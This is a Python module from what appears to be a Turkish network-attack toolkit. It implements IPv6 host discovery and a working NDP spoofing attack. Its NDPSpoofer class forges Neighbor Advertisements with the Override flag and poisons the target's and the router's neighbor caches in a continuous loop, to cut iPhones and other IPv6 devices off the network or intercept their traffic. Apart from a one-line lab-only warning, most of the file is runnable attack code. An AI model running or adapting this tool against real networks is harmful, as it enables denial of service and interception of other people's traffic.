"""
AntiGravity - Modül 4: IPv6 NDP Spoofing (Komşu Keşif Zehirleme)
==================================================================
IPv6 ağlarında ARP'ın karşılığı olan NDP (Neighbor Discovery Protocol)
kullanarak trafik yönlendirme ve cihaz izolasyonu sağlar.

IPv4 ↔ IPv6 Karşılaştırması:
  ┌─────────────────────────────────────────────────────────────┐
  │  IPv4 (ARP)              │  IPv6 (NDP / ICMPv6)            │
  ├──────────────────────────┼─────────────────────────────────┤
  │  ARP Request (who-has)   │  NS - Neighbor Solicitation 135 │
  │  ARP Reply  (is-at)      │  NA - Neighbor Advertisement 136│
  │  Broadcast  ff:ff:ff:ff  │  Multicast ff02::1 (all-nodes)  │
  │  ARP Cache               │  Neighbor Cache                 │
  │  Gratuitous ARP          │  Unsolicited NA                 │
  └──────────────────────────┴─────────────────────────────────┘

iPhone / Modern Cihaz Neden ARP Spoofing'e Dirençlidir?
  - iOS cihazları ağ arayüzü değiştiğinde rastgele MAC (IPv6 Privacy
    Extensions - RFC 4941) kullanır.
  - Modern iOS gateway detection yapar → sahte ARP'ları filtreleyebilir.
  - SLAAC (Stateless Address Autoconfiguration) ile IPv6 adresi alır
    ve bu adres üzerinden iletişim kurar.
  - Çözüm: ARP yerine ICMPv6 NA spoofing ile Neighbor Cache zehirlemek.

NDP Spoofing Çalışma Prensibi:
  1. Hedef cihaza sahte NA gönder:
     "Router'ın MAC adresi = Benim MAC'im"
     → Hedef artık trafiği bize gönderir.

  2. Router'a sahte NA gönder:
     "Hedef cihazın MAC adresi = Benim MAC'im"
     → Router artık hedef trafiğini bize gönderir.

  3. IP Forwarding kapalıysa: hedef internet bağlantısını kaybeder.
  4. IP Forwarding açıksa: şeffaf analiz yapılabilir.

Gereksinimler:
  - sudo / root yetkisi (ham ICMPv6 soketi)
  - pip install scapy
  - IPv6 aktif ağ arayüzü

⚠️  UYARI: Yalnızca kendi lab ortamınızda ve kendi cihazlarınızda kullanın.
"""

import time
import threading
import subprocess
import socket
from typing import Optional

try:
    from scapy.all import (
        Ether, IPv6, ICMPv6ND_NS, ICMPv6ND_NA,
        ICMPv6NDOptDstLLAddr, ICMPv6NDOptSrcLLAddr,
        ICMPv6EchoRequest, ICMPv6EchoReply,
        srp, srp1, sendp, send, conf,
        get_if_hwaddr, getmacbyip6
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

from modules.utils import (
    cprint, Colors, separator, print_table,
    validate_ip, timestamp, get_local_ip
)


# ─── Sabitler ─────────────────────────────────────────────────────────────────

NDP_INTERVAL    = 1.5   # Sahte NA gönderme aralığı (saniye)
NDP_RESTORE_CNT = 5     # Onarma sırasında gönderilecek gerçek NA sayısı

# Özel IPv6 multicast adresleri
IPV6_ALL_NODES   = "ff02::1"   # Tüm bağlantı-yerel düğümler
IPV6_ALL_ROUTERS = "ff02::2"   # Tüm bağlantı-yerel yönlendiriciler
ETH_IPV6_MCAST   = "33:33:00:00:00:01"  # IPv6 multicast Ethernet adresi


# ─── Yardımcı Fonksiyonlar ────────────────────────────────────────────────────

def _strip_zone(ipv6: str) -> str:
    """
    IPv6 adresinden '%iface' zone ID'yi temizler.
    Örn: 'fe80::1%en0' → 'fe80::1'
    Scapy ve socket kütüphaneleri zone ID'yi kabul etmez.
    """
    if ipv6 and '%' in ipv6:
        return ipv6.split('%')[0]
    return ipv6 or ""

def get_local_ipv6(iface: str) -> Optional[str]:
    """
    Belirtilen arayüzün link-local IPv6 adresini döndürür (fe80::...).

    Args:
        iface: Ağ arayüzü adı (örn. 'en0').

    Returns:
        str: fe80:: ile başlayan link-local IPv6 adresi veya None.

    Eğitim Notu:
        Link-local adresler elle yapılandırma gerektirmez.
        EUI-64 veya rastgele (Privacy Extensions) üretilirler.
        Yalnızca yerel bağlantı segmentinde geçerlidir.
    """
    try:
        # socket.getaddrinfo ile arayüze ait IPv6 adreslerini listele
        addrs = socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6)
        for addr in addrs:
            ip = addr[4][0]
            if "%" in ip:
                ip = ip.split("%")[0]
            if ip.startswith("fe80") or ip.startswith("FE80"):
                return ip
    except Exception:
        pass

    # macOS / Linux: ifconfig ile dene
    try:
        result = subprocess.run(
            ["ifconfig", iface],
            capture_output=True, text=True
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet6") and "fe80" in line.lower():
                parts = line.split()
                for p in parts:
                    if p.startswith("fe80"):
                        return p.split("%")[0]
    except Exception:
        pass

    return None


def get_all_ipv6_addresses(iface: str) -> list[str]:
    """
    Bir arayüzdeki tüm IPv6 adreslerini (link-local dahil) döndürür.

    Args:
        iface: Ağ arayüzü adı.

    Returns:
        list: IPv6 adres string'leri listesi.
    """
    addresses = []
    try:
        result = subprocess.run(
            ["ifconfig", iface],
            capture_output=True, text=True
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet6"):
                parts = line.split()
                for p in parts:
                    if ":" in p and not p.startswith("prefixlen"):
                        addr = p.split("%")[0]
                        addresses.append(addr)
    except Exception:
        pass
    return addresses


def mac_to_ipv6_link_local(mac: str) -> str:
    """
    EUI-64 yöntemini kullanarak MAC adresinden link-local IPv6 adresi üretir.

    Algoritma (RFC 4291):
        1. MAC'i iki parçaya böl (ilk 3 ve son 3 oktet)
        2. Araya 'ff:fe' ekle → 64-bit EUI-64
        3. İlk oktetin 7. bitini (Universal/Local) tersine çevir
        4. fe80::/64 önekine ekle

    Args:
        mac: "aa:bb:cc:dd:ee:ff" formatında MAC adresi.

    Returns:
        str: Tahmin edilen link-local IPv6 adresi.

    Örnek:
        "24:18:c6:d2:1c:e6" → "fe80::2618:c6ff:fed2:1ce6"

    Eğitim Notu:
        Bu yöntem modern iOS cihazlarda HER ZAMAN çalışmaz çünkü
        iOS, Privacy Extensions (RFC 4941) ile rastgele IPv6 üretir.
        Ancak bazı cihazlar hâlâ EUI-64 kullanır.
    """
    try:
        parts = mac.split(":")
        # 7. biti (Universal/Local) tersine çevir
        first = int(parts[0], 16) ^ 0x02
        parts[0] = f"{first:02x}"

        # EUI-64 genişleme: aa:bb:cc → aa:bb:cc:ff:fe:dd:ee:ff
        eui64 = [parts[0], parts[1], parts[2], "ff", "fe", parts[3], parts[4], parts[5]]

        # 4 gruplu IPv6 oluştur
        group1 = eui64[0] + eui64[1]
        group2 = eui64[2] + eui64[3]
        group3 = eui64[4] + eui64[5]
        group4 = eui64[6] + eui64[7]

        return f"fe80::{group1}:{group2}:{group3}:{group4}"
    except Exception:
        return "fe80::1"


def solicited_node_multicast(ipv6: str) -> str:
    """
    Bir IPv6 adresi için Solicited-Node Multicast adresini üretir.

    Solicited-Node Multicast:
        ff02::1:ff<son_3_oktet>
        NDP'de belirli bir host'u hedeflemek için kullanılır.
        Tüm ağa broadcast göndermek yerine yalnızca ilgili grubu hedefler.

    Args:
        ipv6: Hedef IPv6 adresi.

    Returns:
        str: Solicited-node multicast adresi.

    Örnek:
        "fe80::2618:c6ff:fed2:1ce6" → "ff02::1:ffd2:1ce6"
    """
    try:
        # Son 24 biti (3 oktet) al
        # IPv6 adresini 128-bit tam sayıya dönüştür
        addr_bytes = socket.inet_pton(socket.AF_INET6, ipv6)
        last3 = addr_bytes[-3:]
        return f"ff02::1:ff{last3[0]:02x}:{last3[1]:02x}{last3[2]:02x}"
    except Exception:
        return "ff02::1:ff00:0001"


# ─── IPv6 Host Keşfi ──────────────────────────────────────────────────────────

class IPv6Discovery:
    """
    ICMPv6 Neighbor Solicitation ile IPv6 host keşfi.

    Scapy'nin srp() fonksiyonu ile ff02::1 (all-nodes multicast) adresine
    NS paketi gönderir ve yanıtlardan host listesi oluşturur.
    """

    def __init__(self, iface: Optional[str] = None):
        self.iface = iface or (conf.iface if SCAPY_AVAILABLE else "en0")
        self.hosts: dict[str, dict] = {}   # {ipv6: {mac, first_seen}}

    def scan_multicast(self, timeout: float = 3.0) -> dict:
        """
        ff02::1 multicast grubuna ICMPv6 Echo Request göndererek
        yanıt veren IPv6 hostları tespit eder.

        Args:
            timeout: Yanıt bekleme süresi (saniye).

        Returns:
            dict: {ipv6_addr: {'mac': ..., 'first_seen': ...}}

        Eğitim Notu:
            ff02::1 = link-local all-nodes multicast
            Tüm IPv6 aktif cihazlar bu gruba üyedir ve
            ICMPv6 Echo Request'e yanıt verebilir.
        """
        if not SCAPY_AVAILABLE:
            raise ImportError("Scapy yüklü değil. → pip install scapy")

        cprint(f"\n  [+] IPv6 Multicast keşfi başlıyor...", Colors.GREEN, bold=True)
        cprint(f"  [*] Hedef   : {IPV6_ALL_NODES} (all-nodes multicast)", Colors.WHITE)
        cprint(f"  [*] Arayüz  : {self.iface}", Colors.WHITE)
        cprint(f"  [*] Timeout : {timeout}s", Colors.WHITE)
        separator()

        local_ipv6 = get_local_ipv6(self.iface) or "fe80::1"

        try:
            # Ethernet broadcast + IPv6 all-nodes multicast + ICMPv6 Echo Request
            pkt = (
                Ether(dst="33:33:00:00:00:01") /
                IPv6(src=local_ipv6, dst=IPV6_ALL_NODES) /
                ICMPv6EchoRequest()
            )

            answered, _ = srp(
                pkt,
                iface=self.iface,
                timeout=timeout,
                verbose=False
            )

            for sent_pkt, recv_pkt in answered:
                src_ip  = recv_pkt[IPv6].src
                src_mac = recv_pkt[Ether].src
                if src_ip not in self.hosts:
                    self.hosts[src_ip] = {
                        "mac"        : src_mac,
                        "first_seen" : timestamp(),
                        "type"       : self._classify_address(src_ip)
                    }

        except PermissionError:
            raise PermissionError("Root yetkisi gerekli → sudo python3 main.py")
        except Exception as e:
            cprint(f"  [!] Multicast tarama hatası: {e}", Colors.YELLOW)

        return self.hosts

    def scan_neighbor_solicitation(self, target_ipv6: str, timeout: float = 2.0) -> Optional[str]:
        """
        Belirli bir IPv6 adresi için NDP NS göndererek MAC adresini çözer.

        Args:
            target_ipv6: Hedef IPv6 adresi.
            timeout: Bekleme süresi.

        Returns:
            str: MAC adresi veya None.

        Eğitim Notu:
            NS (Neighbor Solicitation) = IPv6'nın ARP who-has'ı.
            Solicited-node multicast adresine gönderilir:
                ff02::1:ff<son_3_oktet>
            Hedef cihaz NA (Neighbor Advertisement) ile yanıt verir.
        """
        if not SCAPY_AVAILABLE:
            return None

        local_ipv6 = get_local_ipv6(self.iface) or "fe80::1"
        local_mac  = get_if_hwaddr(self.iface)
        snma       = solicited_node_multicast(target_ipv6)

        try:
            pkt = (
                Ether(dst="33:33:ff:00:00:01") /
                IPv6(src=local_ipv6, dst=snma) /
                ICMPv6ND_NS(tgt=target_ipv6) /
                ICMPv6NDOptSrcLLAddr(lladdr=local_mac)
            )

            ans = srp1(pkt, iface=self.iface, timeout=timeout, verbose=False)
            if ans and ans.haslayer(ICMPv6ND_NA):
                return ans[Ether].src
        except Exception:
            pass
        return None

    def _classify_address(self, ipv6: str) -> str:
        """IPv6 adres türünü sınıflandırır."""
        if ipv6.startswith("fe80") or ipv6.startswith("FE80"):
            return "Link-Local"
        elif ipv6.startswith("fd") or ipv6.startswith("fc"):
            return "Unique-Local"
        elif ipv6.startswith("2") or ipv6.startswith("3"):
            return "Global"
        elif ipv6.startswith("ff"):
            return "Multicast"
        return "Bilinmiyor"

    def display_table(self):
        """Keşfedilen IPv6 hostlarını tablo olarak gösterir."""
        if not self.hosts:
            cprint("  [!] IPv6 host bulunamadı.", Colors.YELLOW)
            return

        cprint(f"\n  ═══  KEŞFEDİLEN IPv6 DÜĞÜMLERİ  ═══", Colors.CYAN, bold=True)
        cprint(f"  Zaman: {timestamp()}", Colors.GRAY)
        separator()

        headers = ["#", "IPv6 Adresi", "MAC Adresi", "Tür", "İlk Görülme"]
        rows    = []
        colors  = []

        for idx, (ipv6, info) in enumerate(self.hosts.items(), 1):
            rows.append([
                str(idx),
                ipv6[:38],
                info["mac"],
                info["type"],
                info["first_seen"]
            ])
            color = Colors.YELLOW if info["type"] == "Link-Local" else Colors.WHITE
            colors.append(color)

        print_table(headers, rows, colors)
        cprint(f"\n  Toplam {len(rows)} IPv6 düğüm tespit edildi.", Colors.GREEN)

    def interactive_scan(self) -> dict:
        """Kullanıcıdan parametreleri alarak IPv6 keşfi başlatır."""
        cprint("\n  ┌─ IPv6 NODE DISCOVERY ──────────────────────────────────┐", Colors.CYAN, bold=True)
        cprint("  │  ICMPv6 ile aktif IPv6 düğümlerini tespit eder        │", Colors.CYAN)
        cprint("  └────────────────────────────────────────────────────────┘\n", Colors.CYAN)

        cprint("  Zaman aşımı saniye [3]: ", Colors.WHITE, end="")
        raw = input().strip()
        try:
            timeout = float(raw) if raw else 3.0
        except ValueError:
            timeout = 3.0

        try:
            self.scan_multicast(timeout=timeout)
            self.display_table()
        except (PermissionError, ImportError) as e:
            cprint(f"  [✗] HATA: {e}", Colors.RED, bold=True)

        return self.hosts


# ─── NDP Spoofing (IPv6 Trafik Yönlendirme) ──────────────────────────────────

class NDPSpoofer:
    """
    ICMPv6 Neighbor Advertisement spoofing ile IPv6 trafik yönlendirme.

    iPhone ve modern cihazlar için:
      - ARP yerine NDP Neighbor Cache zehirleme kullanır.
      - Hem link-local (fe80::) hem global adresler desteklenir.
      - O-flag (Override) = 1 ile mevcut cache kayıtları güncellenebilir.
      - S-flag (Solicited) ile daha inandırıcı yanıtlar üretilebilir.

    Attributes:
        target_ipv6  (str): Hedef cihazın IPv6 adresi.
        target_mac   (str): Hedef cihazın MAC adresi.
        router_ipv6  (str): Gateway'in IPv6 adresi.
        router_mac   (str): Gateway'in MAC adresi.
        attacker_mac (str): Analiz makinesinin MAC adresi.
        active      (bool): Spoofing aktif mi?
    """

    def __init__(self, iface: Optional[str] = None):
        self.iface        = iface or (conf.iface if SCAPY_AVAILABLE else "en0")
        self.target_ipv6  = None
        self.target_mac   = None
        self.router_ipv6  = None
        self.router_mac   = None
        self.attacker_mac = None
        self.local_ipv6   = None
        self.active       = False
        self.packet_count = 0
        self._stop_event  = threading.Event()
        self._thread: Optional[threading.Thread] = None

    # ── NA Paket Fabrikası ────────────────────────────────────────────────────

    def _make_na_spoof(
        self,
        dst_mac: str,       # Ethernet hedef
        dst_ipv6: str,      # IPv6 hedef (Neighbor Cache'i zehirlenecek)
        spoof_ipv6: str,    # Sahte kaynak IP (biz router gibi görünürüz)
    ) -> object:
        """
        Hedef cihazın Neighbor Cache'ini zehirlemek için sahte NA üretir.

        NA (Neighbor Advertisement) Bayrakları:
          R=0  → Biz router DEĞİLiz (hedef bunu zaten biliyor)
          S=1  → Bu bir solicited yanıttır (daha güvenilir görünür)
          O=1  → Override: mevcut cache kaydını geçersiz kıl ← kritik!

        Eğitim Notu:
            O=1 (Override flag) olmadan bazı işletim sistemleri
            mevcut cache kaydını güncellemez. iPhone için O=1 gereklidir.

        Args:
            dst_mac:   Paketi alacak cihazın Ethernet MAC'i.
            dst_ipv6:  Paketi alacak cihazın IPv6 adresi.
            spoof_ipv6: Sahte olarak iddia ettiğimiz IPv6 adresi
                        (gerçekte bu IP gateway veya target'a ait).

        Returns:
            Scapy paket zinciri.
        """
        return (
            Ether(src=self.attacker_mac, dst=dst_mac) /
            IPv6(
                src=self.local_ipv6 or "fe80::1",
                dst=_strip_zone(dst_ipv6)
            ) /
            ICMPv6ND_NA(
                tgt=_strip_zone(spoof_ipv6),  # "Ben bu IP'yim" iddiası
                R=0,              # Router bit
                S=1,              # Solicited: istek üzerine yanıt gibi görünsün
                O=1               # Override: cache'i zorla güncelle
            ) /
            ICMPv6NDOptDstLLAddr(
                lladdr=self.attacker_mac   # "Benim MAC'im bu" → sahte
            )
        )

    def _make_na_restore(
        self,
        dst_mac: str,
        dst_ipv6: str,
        real_ipv6: str,
        real_mac: str,
    ) -> object:
        """
        Orijinal Neighbor Cache'i onarmak için gerçek NA paketi üretir.

        Args:
            dst_mac:   Onarılacak cihazın MAC'i.
            dst_ipv6:  Onarılacak cihazın IPv6'sı.
            real_ipv6: Gerçek kaynak IPv6 adresi.
            real_mac:  Gerçek kaynak MAC adresi.

        Returns:
            Scapy paket zinciri.
        """
        return (
            Ether(src=real_mac, dst=dst_mac) /
            IPv6(src=_strip_zone(real_ipv6), dst=_strip_zone(dst_ipv6)) /
            ICMPv6ND_NA(tgt=_strip_zone(real_ipv6), R=0, S=1, O=1) /
            ICMPv6NDOptDstLLAddr(lladdr=real_mac)
        )

    # ── Spoofing Döngüsü ──────────────────────────────────────────────────────

    def _spoof_loop(self):
        """
        Arka planda sürekli sahte NA paketi gönderen döngü.

        Çift yönlü zehirleme:
          1) Hedefe: "Router'ın MAC'i = benim MAC'im"
          2) Router'a: "Hedefin MAC'i = benim MAC'im"
        """
        cprint(f"  [*] NDP zehirleme döngüsü başladı.", Colors.GRAY)

        while not self._stop_event.is_set():
            try:
                # 1) Hedef cihaza: "Router benim"
                pkt_to_target = self._make_na_spoof(
                    dst_mac=self.target_mac,
                    dst_ipv6=self.target_ipv6,
                    spoof_ipv6=self.router_ipv6,
                )

                # 2) Router'a: "Hedef benim"
                pkt_to_router = self._make_na_spoof(
                    dst_mac=self.router_mac,
                    dst_ipv6=self.router_ipv6,
                    spoof_ipv6=self.target_ipv6,
                )

                sendp(pkt_to_target, iface=self.iface, verbose=False)
                sendp(pkt_to_router, iface=self.iface, verbose=False)
                self.packet_count += 2

            except OSError as e:
                cprint(f"  [!] Paket gönderme hatası: {e}", Colors.RED)
                break

            self._stop_event.wait(NDP_INTERVAL)

    # ── Neighbor Cache Onarımı ────────────────────────────────────────────────

    def _restore_neighbor_cache(self):
        """
        Yönlendirme durdurulduğunda orijinal Neighbor Cache'leri onarır.

        Eğitim Notu:
            IPv6 Neighbor Cache'in ömrü ARP Cache'ten daha uzundur (dakikalar).
            Onarım yapılmazsa cihaz uzun süre bağlantısız kalabilir.
        """
        cprint("  [*] IPv6 Neighbor Cache onarılıyor...", Colors.YELLOW)

        for _ in range(NDP_RESTORE_CNT):
            try:
                # Hedefe gerçek router MAC'ini bildir
                sendp(
                    self._make_na_restore(
                        dst_mac=self.target_mac,
                        dst_ipv6=self.target_ipv6,
                        real_ipv6=self.router_ipv6,
                        real_mac=self.router_mac,
                    ),
                    iface=self.iface, verbose=False
                )
                # Router'a gerçek hedef MAC'ini bildir
                sendp(
                    self._make_na_restore(
                        dst_mac=self.router_mac,
                        dst_ipv6=self.router_ipv6,
                        real_ipv6=self.target_ipv6,
                        real_mac=self.target_mac,
                    ),
                    iface=self.iface, verbose=False
                )
                time.sleep(0.3)
            except Exception as e:
                cprint(f"  [!] Onarım hatası: {e}", Colors.YELLOW)

        cprint("  [✓] IPv6 Neighbor Cache onarıldı.", Colors.GREEN)

    # ── MAC Çözümleme ─────────────────────────────────────────────────────────

    def _resolve_mac(self, ipv6: str) -> Optional[str]:
        """
        IPv6 adresin MAC adresini çözümler.

        Yöntem 1: Scapy getmacbyip6()
        Yöntem 2: Manuel NS göndererek NA yanıtı alma
        Yöntem 3: Sistem 'ip neighbor' veya 'ndp' tablosundan okuma

        Args:
            ipv6: Çözümlenecek IPv6 adresi.

        Returns:
            str: MAC adresi veya None.
        """
        # Yöntem 1: Scapy built-in
        try:
            mac = getmacbyip6(ipv6)
            if mac:
                return mac
        except Exception:
            pass

        # Yöntem 2: Sistem neighbor tablosu
        try:
            # macOS: ndp -n komutu
            result = subprocess.run(
                ["ndp", "-n", "-a"],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.splitlines():
                if ipv6.lower() in line.lower():
                    parts = line.split()
                    for p in parts:
                        if ":" in p and len(p) == 17:
                            return p
        except Exception:
            pass

        # Yöntem 3: Linux ip neighbor
        try:
            result = subprocess.run(
                ["ip", "-6", "neighbor", "show"],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.splitlines():
                if ipv6.lower() in line.lower() and "lladdr" in line:
                    parts = line.split()
                    idx = parts.index("lladdr")
                    return parts[idx + 1]
        except Exception:
            pass

        return None

    # ── Başlat / Durdur ───────────────────────────────────────────────────────

    def start(
        self,
        target_ipv6: str,
        router_ipv6: str,
        target_mac: Optional[str] = None,
        router_mac: Optional[str] = None,
    ) -> bool:
        """
        NDP spoofing'i başlatır.

        Args:
            target_ipv6: Hedef cihazın IPv6 adresi (link-local veya global).
            router_ipv6: Gateway'in IPv6 adresi.
            target_mac:  Hedef MAC (None ise otomatik çözümlenir).
            router_mac:  Router MAC (None ise otomatik çözümlenir).

        Returns:
            bool: Başarılı ise True.
        """
        if not SCAPY_AVAILABLE:
            raise ImportError("Scapy yüklü değil. → pip install scapy")

        if self.active:
            cprint("  [!] NDP Spoofing zaten aktif!", Colors.YELLOW)
            return False

        # Zone ID temizle (fe80::1%en0 → fe80::1)
        self.target_ipv6 = _strip_zone(target_ipv6)
        self.router_ipv6 = _strip_zone(router_ipv6)
        self.local_ipv6  = get_local_ipv6(self.iface)

        cprint(f"\n  [+] IPv6 NDP Spoofing başlatılıyor...", Colors.GREEN, bold=True)
        cprint(f"  [*] Hedef IPv6  : {target_ipv6}", Colors.WHITE)
        cprint(f"  [*] Router IPv6 : {router_ipv6}", Colors.WHITE)
        cprint(f"  [*] Yerel IPv6  : {self.local_ipv6 or 'Bilinmiyor'}", Colors.WHITE)
        cprint(f"  [*] Arayüz      : {self.iface}", Colors.WHITE)
        separator()

        # Attacker MAC
        try:
            self.attacker_mac = get_if_hwaddr(self.iface)
        except Exception:
            self.attacker_mac = "00:00:00:00:00:00"

        # MAC çözümleme
        cprint("  [*] MAC adresleri çözümleniyor...", Colors.CYAN)

        self.target_mac = target_mac or self._resolve_mac(target_ipv6)
        self.router_mac = router_mac or self._resolve_mac(router_ipv6)

        if not self.target_mac:
            raise RuntimeError(
                f"Hedef MAC çözümlenemedi ({target_ipv6}).\n"
                f"  → Cihaz aktif mi? IPv6 ping deneyin: ping6 {target_ipv6}%{self.iface}"
            )
        if not self.router_mac:
            raise RuntimeError(
                f"Router MAC çözümlenemedi ({router_ipv6}).\n"
                f"  → Router IPv6 adresi doğru mu?"
            )

        cprint(f"  [✓] Hedef MAC  : {self.target_mac}", Colors.GREEN)
        cprint(f"  [✓] Router MAC : {self.router_mac}", Colors.GREEN)
        cprint(f"  [✓] Analiz MAC : {self.attacker_mac}", Colors.GREEN)

        # Thread başlat
        self._stop_event.clear()
        self.packet_count = 0
        self._thread = threading.Thread(
            target=self._spoof_loop,
            name="NDP-Spoof-Thread",
            daemon=True
        )
        self._thread.start()
        self.active = True

        cprint(f"\n  [✓] NDP Spoofing AKTİF  →  iPhone / IPv6 cihazı izole edildi.", Colors.GREEN, bold=True)
        cprint(f"  [!] Durdurmak için ana menüden [8] seçeneğini kullanın.", Colors.YELLOW)
        return True

    def stop(self, restore: bool = True) -> int:
        """
        NDP spoofing'i durdurur.

        Args:
            restore: Neighbor Cache onarılsın mı?

        Returns:
            int: Gönderilen toplam sahte NA paketi sayısı.
        """
        if not self.active:
            cprint("  [!] Aktif NDP spoofing bulunamadı.", Colors.YELLOW)
            return 0

        cprint(f"\n  [*] NDP Spoofing durduruluyor...", Colors.YELLOW)
        self._stop_event.set()

        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=5)

        if restore:
            self._restore_neighbor_cache()

        total = self.packet_count
        self.active = False
        self.packet_count = 0

        cprint(f"  [✓] NDP Spoofing durduruldu. Toplam {total} sahte NA paketi gönderildi.", Colors.GREEN)
        return total

    def status(self):
        """NDP spoofing durumunu gösterir."""
        separator()
        if self.active:
            cprint("  [●] IPv6 NDP DURUM: AKTİF", Colors.GREEN, bold=True)
            cprint(f"  Hedef  : {self.target_ipv6}  ({self.target_mac})", Colors.WHITE)
            cprint(f"  Router : {self.router_ipv6}  ({self.router_mac})", Colors.WHITE)
            cprint(f"  Gönderilen Sahte NA: {self.packet_count}", Colors.CYAN)
        else:
            cprint("  [○] IPv6 NDP DURUM: DEVRE DIŞI", Colors.GRAY, bold=True)
        separator()

    # ── İnteraktif Menü ──────────────────────────────────────────────────────

    def interactive_spoof(self, known_hosts: dict = None):
        """
        Kullanıcıdan IPv6 adresi ve router bilgisi alarak NDP spoofing başlatır.

        Args:
            known_hosts: Önceki IPv6 Discovery bulgularından gelen host sözlüğü.
        """
        cprint("\n  ┌─ IPv6 NDP SPOOFING MODÜLÜ ─────────────────────────────┐", Colors.MAGENTA, bold=True)
        cprint("  │  ICMPv6 NA ile iPhone/IPv6 cihaz izolasyonu           │", Colors.MAGENTA)
        cprint("  └────────────────────────────────────────────────────────┘\n", Colors.MAGENTA)

        # EUI-64 ipucu
        cprint("  [İPUCU] IPv4 MAC'inden IPv6 üretmek için:", Colors.GRAY)
        cprint("          MAC örnek: 24:18:c6:d2:1c:e6", Colors.GRAY)
        cprint(f"          → {mac_to_ipv6_link_local('24:18:c6:d2:1c:e6')}", Colors.GRAY)
        separator()

        # Bilinen IPv6 hostları göster
        if known_hosts:
            cprint("  Keşfedilen IPv6 hostları:", Colors.CYAN)
            for ipv6, info in known_hosts.items():
                cprint(f"    {ipv6[:40]}  →  {info['mac']}  [{info['type']}]", Colors.WHITE)
            separator()

        cprint("  Hedef IPv6 adresi (örn: fe80::2618:c6ff:fed2:1ce6): ", Colors.WHITE, end="")
        target_ipv6 = input().strip()

        cprint("  Router/Gateway IPv6 adresi (örn: fe80::1 veya fe80::router): ", Colors.WHITE, end="")
        router_ipv6 = input().strip()

        cprint("  Hedef MAC (boş = otomatik çözümle): ", Colors.WHITE, end="")
        raw_tmac = input().strip()
        target_mac = raw_tmac if raw_tmac else None

        cprint("  Router MAC (boş = otomatik çözümle): ", Colors.WHITE, end="")
        raw_rmac = input().strip()
        router_mac = raw_rmac if raw_rmac else None

        try:
            self.start(
                target_ipv6=target_ipv6,
                router_ipv6=router_ipv6,
                target_mac=target_mac,
                router_mac=router_mac,
            )
        except (ImportError, PermissionError, ValueError, RuntimeError, OSError) as e:
            cprint(f"\n  [✗] HATA: {e}", Colors.RED, bold=True)


# ─── MAC Yardımcı ─────────────────────────────────────────────────────────────

def mac_helper_menu():
    """
    MAC adresinden IPv6 üretme ve neighbor tablosu görüntüleme yardımcısı.
    """
    cprint("\n  ┌─ MAC / IPv6 YARDIMCI ARAÇLARI ────────────────────────────┐", Colors.YELLOW, bold=True)
    cprint("  │  [1] MAC → EUI-64 IPv6 dönüşümü                         │", Colors.YELLOW)
    cprint("  │  [2] Sistem Neighbor Cache göster (ndp / ip neighbor)    │", Colors.YELLOW)
    cprint("  │  [3] ping6 ile IPv6 hedef test                          │", Colors.YELLOW)
    cprint("  └────────────────────────────────────────────────────────────┘\n", Colors.YELLOW)

    cprint("  Seçim [1-3]: ", Colors.WHITE, end="")
    choice = input().strip()

    if choice == "1":
        cprint("  MAC adresi girin (örn. 24:18:c6:d2:1c:e6): ", Colors.WHITE, end="")
        mac = input().strip()
        ipv6 = mac_to_ipv6_link_local(mac)
        cprint(f"\n  [✓] EUI-64 Link-Local IPv6: {ipv6}", Colors.GREEN, bold=True)
        cprint(f"  [!] Not: iOS Privacy Extensions aktifse bu adres farklı olabilir.", Colors.YELLOW)

    elif choice == "2":
        cprint("\n  Sistem Neighbor Cache:", Colors.CYAN)
        try:
            # macOS
            result = subprocess.run(["ndp", "-n", "-a"], capture_output=True, text=True)
            if result.returncode == 0:
                cprint(result.stdout, Colors.WHITE)
            else:
                # Linux
                result = subprocess.run(
                    ["ip", "-6", "neighbor", "show"],
                    capture_output=True, text=True
                )
                cprint(result.stdout, Colors.WHITE)
        except FileNotFoundError:
            cprint("  [!] 'ndp' veya 'ip' komutu bulunamadı.", Colors.YELLOW)

    elif choice == "3":
        cprint("  Hedef IPv6 adresi: ", Colors.WHITE, end="")
        target = input().strip()
        cprint("  Arayüz (örn. en0): ", Colors.WHITE, end="")
        iface = input().strip() or "en0"

        cprint(f"\n  ping6 {target}%{iface} ...", Colors.CYAN)
        try:
            result = subprocess.run(
                ["ping6", "-c", "4", f"{target}%{iface}"],
                capture_output=True, text=True, timeout=10
            )
            cprint(result.stdout, Colors.WHITE)
            if result.returncode == 0:
                cprint("  [✓] Hedef erişilebilir.", Colors.GREEN)
            else:
                cprint("  [✗] Hedef yanıt vermiyor.", Colors.RED)
        except subprocess.TimeoutExpired:
            cprint("  [!] ping6 zaman aşımı.", Colors.YELLOW)
        except FileNotFoundError:
            cprint("  [!] ping6 komutu bulunamadı.", Colors.YELLOW)
